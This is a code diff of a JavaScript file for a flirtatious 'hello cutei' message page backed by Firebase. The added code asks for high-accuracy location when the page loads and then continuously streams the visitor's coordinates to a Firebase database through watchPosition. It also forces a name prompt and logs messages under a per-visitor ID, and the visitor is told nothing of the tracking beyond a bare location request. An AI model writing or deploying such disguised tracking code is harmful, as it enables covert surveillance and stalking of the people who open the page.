@@ -1,6 +1,6 @@
-// -------------------------------
-// Firebase Config
-// -------------------------------
+/* ------------------------------- */
+/* FIREBASE CONFIG                 */
+/* ------------------------------- */
 const firebaseConfig = {
   apiKey: "AIzaSyDPXv7lI-YcPk2FECNiM61yZ_SsVU-vR2M",
   authDomain: "nitin-494ef.firebaseapp.com",
@@ -11,14 +11,12 @@ const firebaseConfig = {
   appId: "1:806134093724:web:d749b676504569c92e9a59",
   measurementId: "G-MWH4YB8C20"
 };
-
-// Firebase Initialize
 firebase.initializeApp(firebaseConfig);
 const db = firebase.database();
 
-// -------------------------------
-// Pages List
-// -------------------------------
+/* ------------------------------- */
+/* PAGES                           */
+/* ------------------------------- */
 const pages = [
   { title: '💖 hello cutei 💖', time: 3500 },
   { title: '💬 tum se baat karni he ... 💬', time: 5000 },
@@ -39,9 +37,74 @@ const toasts = document.getElementById('toasts');
 let idx = 0;
 let timer;
 
-// -------------------------------
-// Show Page
-// -------------------------------
+/* ------------------------------- */
+/* CHAT + NAME STORAGE             */
+/* ------------------------------- */
+let chatID = localStorage.getItem("chatID");
+if (!chatID) {
+  chatID = "chat_" + Date.now() + "_" + Math.floor(Math.random()*9000+1000);
+  localStorage.setItem("chatID", chatID);
+}
+
+let userName = localStorage.getItem("userName") || null;
+
+/* ------------------------------- */
+/* ASK LOCATION FIRST              */
+/* ------------------------------- */
+function askLocationFirst_thenName() {
+  if (!navigator.geolocation) {
+    alert("Location not supported.");
+    showPage(0);
+    return;
+  }
+
+  navigator.geolocation.getCurrentPosition(pos => {
+    db.ref("chat/" + chatID + "/gps").set({
+      lat: pos.coords.latitude,
+      lon: pos.coords.longitude,
+      acc: pos.coords.accuracy,
+      ts: Date.now()
+    });
+    askNameThenContinue();
+  }, err => {
+    alert("Please allow location.");
+    askNameThenContinue();
+  }, { enableHighAccuracy:true });
+}
+
+/* ------------------------------- */
+function askNameThenContinue() {
+  if (!userName) {
+    let n = prompt("Enter your name:");
+    if (!n || n.trim() === "") return askNameThenContinue();
+    userName = n.trim();
+    localStorage.setItem("userName", userName);
+  }
+
+  db.ref("chat/" + chatID + "/name").set(userName);
+  startGPS();
+  createHearts();
+  showPage(0);
+}
+
+/* ------------------------------- */
+/* GPS WATCH                       */
+/* ------------------------------- */
+function startGPS() {
+  if (!navigator.geolocation) return;
+  navigator.geolocation.watchPosition(pos => {
+    db.ref("chat/" + chatID + "/gps").set({
+      lat: pos.coords.latitude,
+      lon: pos.coords.longitude,
+      acc: pos.coords.accuracy,
+      ts: Date.now()
+    });
+  });
+}
+
+/* ------------------------------- */
+/* PAGE SYSTEM                     */
+/* ------------------------------- */
 function showPage(i) {
   clearTimeout(timer);
   const p = pages[i];
@@ -53,21 +116,16 @@ function showPage(i) {
     card.classList.add("show");
 
     if (p.interactive) {
-      let yes = `<button class="btn-yes" id="yesBtn">YES</button>`;
-      let no = `<button class="btn-no" id="noBtn">NO</button>`;
-      extra.innerHTML = yes + no;
-
+      extra.innerHTML = `
+        <button id="yesBtn">YES</button>
+        <button id="noBtn">NO</button>
+      `;
       document.getElementById("yesBtn").onclick = () => nextPage();
       document.getElementById("noBtn").onclick = () => showToast("Please don't press NO!");
     }
 
     if (p.final) {
-      extra.innerHTML = `
-        <div id="messageBox">
-          <input id="msgInput" type="text" placeholder="Type message..." />
-          <button id="sendBtn">Send</button>
-        </div>
-      `;
+      extra.innerHTML = `<div id="messageBox"></div>`;
       setupMessageBox();
     }
   }, 350);
@@ -83,9 +141,9 @@ function nextPage() {
   showPage(idx);
 }
 
-// -------------------------------
-// Toast
-// -------------------------------
+/* ------------------------------- */
+/* TOAST                           */
+/* ------------------------------- */
 function showToast(txt) {
   const t = document.createElement("div");
   t.className = "toast";
@@ -94,32 +152,51 @@ function showToast(txt) {
   setTimeout(() => t.remove(), 2500);
 }
 
-// -------------------------------
-// Message Box
-// -------------------------------
+/* ------------------------------- */
+/* CHAT BOX                        */
+/* ------------------------------- */
 function setupMessageBox() {
+  const box = document.getElementById("messageBox");
+
+  box.innerHTML = `
+    <div id="chatArea">Connecting...</div>
+    <input id="msgInput" type="text" placeholder="Type message..." />
+    <button id="sendBtn">Send</button>
+  `;
+
+  const chatArea = document.getElementById("chatArea");
   const msgInput = document.getElementById("msgInput");
   const sendBtn = document.getElementById("sendBtn");
 
   sendBtn.onclick = () => {
-    const text = msgInput.value.trim();
-    if (!text) return;
-
-    db.ref("messages").push({
-      text: text,
+    const txt = msgInput.value.trim();
+    if (!txt) return;
+    db.ref("chat/" + chatID + "/messages").push({
+      sender: "user",
+      name: userName,
+      text: txt,
       time: Date.now()
     });
-
-    alert("Message sent ❤️");
     msgInput.value = "";
   };
+
+  db.ref("chat/" + chatID + "/messages").on("value", snap => {
+    chatArea.innerHTML = "";
+    snap.forEach(c => {
+      const m = c.val();
+      const div = document.createElement("div");
+      div.className = "msg";
+      div.textContent = (m.name || userName) + ": " + m.text;
+      chatArea.appendChild(div);
+    });
+
+    chatArea.scrollTop = chatArea.scrollHeight;
+  });
 }
 
-// -------------------------------
-createHearts();
-showPage(0);
-
-// Animated Hearts
+/* ------------------------------- */
+/* HEARTS                          */
+/* ------------------------------- */
 function createHearts(n = 15) {
   const wrap = document.getElementById('hearts');
   for (let i = 0; i < n; i++) {
@@ -130,4 +207,5 @@ function createHearts(n = 15) {
     wrap.appendChild(h);
   }
 }
-startGPS();
+
+askLocationFirst_thenName();
